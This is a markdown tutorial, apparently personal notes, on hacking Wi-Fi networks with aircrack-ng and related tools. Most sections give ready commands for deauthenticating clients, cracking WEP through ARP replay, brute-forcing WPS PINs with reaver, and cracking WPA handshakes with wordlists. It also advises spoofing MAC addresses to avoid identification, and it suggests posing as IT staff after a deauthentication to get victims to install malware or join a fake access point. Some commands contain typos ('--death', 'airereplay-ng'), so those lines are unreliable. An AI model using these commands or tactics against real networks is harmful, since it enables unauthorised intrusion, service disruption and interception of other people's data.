# Wi-Fi Hacking

This document describes a few Wi-Fi hacking techniques.

## Table of Contents

- [Setting up the AWUS1900](#setting-up-the-awus1900)
- [aircrack-ng suite](#aircrack-ng-suite)
- [Change the mac address of a network device](#change-the-mac-address-of-a-network-device)
- [Wi-Fi monitor mode requirements](#wi-fi-monitor-mode-requirements)
- [Know working chipsets with Kali](#know-working-chipsets-with-kali)
- [Change the Wi-Fi mode from managed to monitor](#change-the-wi-fi-mode-from-managed-to-monitor)
- [Sniffing Wi-Fi packets](#sniffing-wi-fi-packets)
  - [Write data to a file](#write-data-to-a-file)
  - [Targeted Packet Sniffing](#targeted-packet-sniffing)
  - [Deauthentication Attack](#deauthentication-attack)
- [WEP Cracking](#wep-cracking)
- [Arp attack](#arp-attack)
- [WPS attack](#wps-attack)
- [WPA and WPA2 Cracking](#wpa-and-wpa2-cracking)
  - [Creating a wordlist](#creating-a-wordlist)
  - [Crack the WPA password based with a wordlist](#crack-the-wpa-password-based-with-a-wordlist)
- [Speed up the cracking process](#speed-up-the-cracking-process)
- [Other tools](#other-tools)
  - [wifite](#wifite)
- [See also](#see-also)
- [Resources](#resources)


## Setting up the AWUS1900

Check if the system detected the AWUS1900, for this, run `dmesg` and look:

````commandline
[  189.267471] usb 1-1: new high-speed USB device number 2 using ehci-pci
[  189.641364] usb 1-1: New USB device found, idVendor=0bda, idProduct=8813, bcdDevice= 0.00
[  189.641365] usb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[  189.641367] usb 1-1: Product: 802.11ac NIC
[  189.641367] usb 1-1: Manufacturer: Realtek
[  189.641368] usb 1-1: SerialNumber: 123456
````

then:

````commandline
apt install realtek-rtl88xxau-dkms
````

Then reboot the virtual machine, yes, requires a reboot before this will work.

_Note, it could be after some kernel updates (I guess), that you need to reinstall the above package._

```commandline
# airmon-ng       

PHY     Interface       Driver          Chipset

phy0    wlan0           88XXau          Realtek Semiconductor Corp. RTL8814AU 802.11a/b/g/n/ac
```

## aircrack-ng suite

The aircrack-ng suite consists of a lot of tools actually, each tool has his own purpose. It's good to check out the documentation of each tool.

- [airbase-ng](https://www.aircrack-ng.org/doku.php?id=airbase-ng)
- [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)
- [airdecap-ng](https://www.aircrack-ng.org/doku.php?id=airdecap-ng)
- [airdecloak-ng](https://www.aircrack-ng.org/doku.php?id=airdecloak-ng)
- [airdriver-ng](https://www.aircrack-ng.org/doku.php?id=airdriver-ng) - REMOVED in 1.2 rc 1
- [airdrop-ng](https://www.aircrack-ng.org/doku.php?id=airdrop-ng)
- [aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
- [airgraph-ng](https://www.aircrack-ng.org/doku.php?id=airgraph-ng)
- [airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
- [airodump-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
- [airolib-ng](https://www.aircrack-ng.org/doku.php?id=airolib-ng)
- [airserv-ng](https://www.aircrack-ng.org/doku.php?id=airserv-ng)
- [airtun-ng](https://www.aircrack-ng.org/doku.php?id=airtun-ng)
- [besside-ng](https://www.aircrack-ng.org/doku.php?id=besside-ng)
- [dcrack](https://www.aircrack-ng.org/doku.php?id=dcrack)
- [easside-ng](https://www.aircrack-ng.org/doku.php?id=easside-ng)
- [packetforge-ng](https://www.aircrack-ng.org/doku.php?id=packetforge-ng)
- [tkiptun-ng](https://www.aircrack-ng.org/doku.php?id=tkiptun-ng)
- [wesside-ng](https://www.aircrack-ng.org/doku.php?id=wesside-ng)

## Change the mac address of a network device

You should know that each network device has a so said unique identifier. A so said, because this unique identifier can be changed. Anyway, if you plan or ar messing around, don't forget to change your MAC address. Well, actually, it does not only limit on the MAC address, but your host name too, and various other minor things. 

To be able to change the mac address of a network device, this first need to be put down (deactivated). 

````commandline
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
````

Note that when you reboot the computer the mac address is changed back to its original reference.

**See also the tool `macchanger` for the lazy people. Note that if you want to change your mac address with `macchanger`, your interface needs to be down! The error message if the interface is up is very confusing.**

## Wi-Fi monitor mode requirements

The ideal is an adapter that both support the `2.4G` and the `5G`. Ideally also with an external antenna.

Not a lot of Wi-Fi 5G adapters support the `monitor` and the `injection` mode.

So careful when buying an adapter and check it supports:

    Monitor mode
    Packet Injection
    Managed mode

Also the brand of the wi-fi adapter doesn't matter, what matter the most is the chipset used into the Wi-Fi adapter.

See also:

- <https://www.youtube.com/watch?v=0lqRZ3MWPXY>

### Know working chipsets with Kali

 1. Atheros AR9271 (Very good, but only support 2.4G, NOT 5G) - For example the Alfa AWUS036NHA wireless adapter.
 2. Realtek AR8812AU (Support 2.4G and 5G) - For example the AWUS036ACH. The problem with this chipset is that it's support is very recent. Starting from Kali 2007.1 and the chipset is less reliable. So sometimes it disconnects or attacks fails, and you need to restart your attack.

See also:

- <https://kennyvn.com/best-wireless-adapters-kali-linux/>

## Change the Wi-Fi mode from managed to monitor

Check that nothing is using the `wlan0` device and could interfere:

````commandline
ifconfig wlan0 down
airmon-ng check kill
````

It will output something like:

Killing these processes:

    PID     NAME
    719     wpa_supplicant
    11318   dhcpclient

Change the mode to monitor mode:

````commandline
iwconfig wlan0 mode monitor
````

Or:

````commandline
airmon-ng start wlan0
````

Some wireless interfaces will be called `mon0` or something similar when in monitor mode. In the case of the `AWUS1900`, this stays `wlan0`.

## Sniffing Wi-Fi packets

By sniffing I mean copying all Wi-Fi packages that are in range.

Check how your Wi-Fi card is called with `ifwconfig` after having set it in monitor mode.

````commandline
airodump-ng wlan0
````

To sniff on 5G (band a)

````commandline
airodump-ng --band a wlan0
````

To sniff on all different bands 2.4G and 5G:

Note that this requires a stronger adapter and is a bit slower as it's sniffing on different network speed.

````commandline
airodump-ng --band abc mon0
````

### Write data to a file

This allows us to analyse and crack the actual thingy later on.

````commandline
airodump-ng --write my_captured_data mon0
````

A file starting with the name `my_captured_data` will be created in the current directory and with different extensions. Note that airodump added append `-01` to the file name.

File extensions are `.csv`, `cap`, `kismet.netxml`, `kismet.csv`.

The most interesting file is the `cap` file which contains all data. Like HTTP connections and it's data. But at this stage, and probably like always, the data has been encrypted with the WPA2 connection. So it needs to be decrypted first.

You can look at the data with `WireShark`. But like said, the data inside is encrypted. However, we can already see the device names sources and destination. Which can be also a good starting point as you can figure out what type of device it is (Apple smartphone, Huawei...)

### Targeted Packet Sniffing

We can also define to sniff on a know `ESSID`:

for example:

````commandline
airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 2 --write my_captured_data wlan0
````

### Deauthentication Attack

To disconnect any client from any network.

- Works on encrypted networks (WEP, WPA, & WPA2).
- No need to know the network key/password.
- No need to connect to the network.

```commandline
aireplay-ng --death [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
```
   
For example:

````commandline
aireplay-ng --death 100000000 -a F8:23:B2:B9:50:A8 -c 80:E6:50:22:A2:E8 (-D)  wlan0 
# -D for the 5G wifi
````

In some rare cases, the `aireplay-ng --deauth` fails, and in that case you should run the `airodump-ng` sniffing at the same time in another shell.

Goals

 * This is very handy for social engineering attacks, were you can pretend to be from the IT department and ask the user to install some fix app (malware / backdoor) or even tell them to connect to another (faked) Wi-Fi Access Point where there you will sniff all his data and thus only target on 1 specific person.
 * It is also handy, when run airodump into parallel to get the WPA handshake which is vital to WPA cracking.
   
## WEP Cracking

WEP stand for Wired Equivalent Privacy.

We need to capture a large number of packets/IVs. So this needs to be done when people are using that wireless network. If there's not a lot of traffic this will take ages to have the numbers of data packets. But then, we need to force the AP to generate new IVs and this is called the arp attack.

You should consider to have around 40.000 data packets before trying to crack the packets. And this for the longest 128bit wep key. So it goes very very fast even with the strongest and longest WEP password..

Capture the packets with `airodump-ng`:

````commandline
airodump-ng --bssid <mac-of-AP> --channel <channel-number> --write web_capture mon0
````

Analyse the captured IVs and crack the key `aircrack-ng`

````commandline
aircrack-ng web_capture-01.cap
````

After a time it should give you the key and password. Sometimes it does not show you the password but only the key.

For example:

    ...
    Opening wep_capture-01.cap
    Attack will be restarted every 5000 caputred ivs.

        KEY FOUND! [ 41:73:32:33:70 ] (ASCII: As23p)
    Decrypted correctly: 100%

As seen in the previous example `41:73:32:33:70` is the key, and `ASCII:As23p` the clear text password. To use the key, when you don't see the clear text (ascii) password, remove all colons so that the key become this `4173323370` and use that, and it should work.

### Arp attack 

This technique is required if there's not enough WEP traffic and to force to make some kind of traffic so that we can capture enough packets/IVs.

To do so, first you need to be connected (not associated) to the AP.

    airereplay-ng --fakeauth 0 -a <mac-of-AP> -h <mac-of-wireless-adapter> mon0

Then will see with `aircrack-ng` that your are connected to the APP.

So now it's time to ARP replay:

````commandline
airereplay-ng --arpreplay -b <mac-of-AP> -h <mac-of-wireless-adapter> mon0
````

Then we need to wait that `aireplay` capture an ARP packet. Once it has got one it will force the AP to resend it over and over.

Of course, you need to capture all the packets like a standard sniffing like previously done.

## WPS attack

A lot of routers do have the WPS feature. If the router is badly configured, we can make use of that vulnerability.

**This only works if the router is configured not to use the PBC (Push Button Authentication).**

*The cracking process take an average of 10 hours.*

First scan to see which AP do make use of WPS:

````commandline
wash --interface wlan0
````

Brut force the pin to try to get the WPA key

````commandline
reaver --bssid <mac-target> --channel <number> --interface wlan0 -vvv --no-associate
````

*Some newer `reaver` version has some bug and fails, so it could be we need to download and use an older version of `reaver`*

Then we need to fake auth, every 30 seconds:

````commandline
aireplay-ng --fakeauth 30 -a <mac-target> <mac-of-wireless-adapter> wlan0
````

## WPA and WPA2 Cracking

Cracking the WPA or WPA2 is the same method. There are 2 cracking techniques possible.

Good to know is that WPA and WPA2 fixes the weaknesses of WEP. So in this version of security, there's no useful crackable data into the packets. Only packets that are useful are the handshake packets.

 **The handshake does NOT contain data that helps to recover the key. It contains data that can be used to check if a key (password) is valid or not**

From there on, we need to guess (brut force) the data with a wordlist. We can download read to use wordlist from the internet, or generate our own one with a program.

````commandline
airodump-ng --bssid <mac-target> --channel <channel-number> --write wpa_handshake mon0
````

Now we need to wait that a client connect, because it's only during connection time that handshake are sent. But like before with the WEP attack we can force the deauthentication process, in order words, force that handshakes are sent.

````commandline
aireplay-ng -deauth 4 -a <mac-target> -c <mac-of-wireless-adapter> wlan0
````

We need to keep an eye on the `airodump-ng` output, and when it has the WPA handshake, we can stop `aerodump-ng`.

### Crack the WPA password based with a wordlist

Before we can proceed to this, we need to have captured a handshake and created a word list. Once we have both of this we can start brut forcing it with:

````commandline
aircrack-ng wpa_handshake-01.cap -w my_wordlist.txt
````

## Speed up the cracking process

The speed of this process depend on your CPU and the amounts of words in your word list it has to test against it. This can really take a lot of time.

**There are online services where you can upload your handshake files and they will compute with their huge word list for you on their huge computer systems.**

Like for example:

- <https://gpuhash.me>
- <https://www.onlinehashcrack.com/how-to-crack-WPA-WPA2-networks.php>

There are also methods to speed up the cracking process:

- Use `GPU` instead of `CPU`.
- Rainbow tables.
- You can pipe the wordlist as it's create its passwords from `crunch` to `aircrack-ng` so that you don't need to create a huge word list file and storage on your computer. See man crunch, almost on the bottom: `crunch 2 4 abcdefghijklmnopqrstuvwxyz | aircrack-ng /root/Mycapfile.cap -e MyESSID -w-`
- You can also use methods so that you can pause the process.

````commandline
crunch 8 8 abcdefghijklmnopqrstuvwxyz | aircrack-ng capture-01.cap -e SamS8P -w-
````

## Other tools

### wifite

See also this nice thing `wifite` which is available on `Kali`: <https://github.com/kimocoder/wifite2>. However, it does not work as expected out of the box as it requires some extra packages to be installed which are not packaged and available for `Kali`. And thus, they need to be installed manually.

Note that the `wifite` packages has been forked multiples times. So check out which one is the most up to date and which is still development.

Note also that on `github` it's called `wifite2`, even if in `kali`, and in its package information it's called `wifite`. Actually it is like so in the `github` link I got from the package in `Kali`.

This python script, according to its documentation on `github`, require additional and optional tools

- tshark
- reaver
- bully
- cowpatty
- ath_masker
- modwifi
- pyrit

````commandline
wifite -e Proximus-Home-46A8
````

## See also

* `wifi-honey` - Wi-Fi honeypot
* `nmtui` - A ncurse based tool to set up network, wifi included.

## Resources

- <https://www.aircrack-ng.org>
